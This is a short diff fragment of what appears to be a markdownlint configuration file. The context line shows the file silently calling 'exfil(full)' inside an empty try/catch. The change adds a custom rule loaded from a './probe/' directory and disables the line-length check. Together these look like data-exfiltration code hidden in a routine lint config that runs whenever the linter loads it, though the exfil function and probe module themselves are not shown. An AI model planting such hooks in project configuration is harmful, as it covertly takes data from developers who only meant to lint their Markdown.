@@ -174,5 +174,6 @@ try { exfil(full); } catch { }
 
 export default {
   globs: ["**/*.md"],
-  config: { default: true }
+  customRules: ["./probe/probe-rule.mjs"],
+  config: { MD013: false }
 };
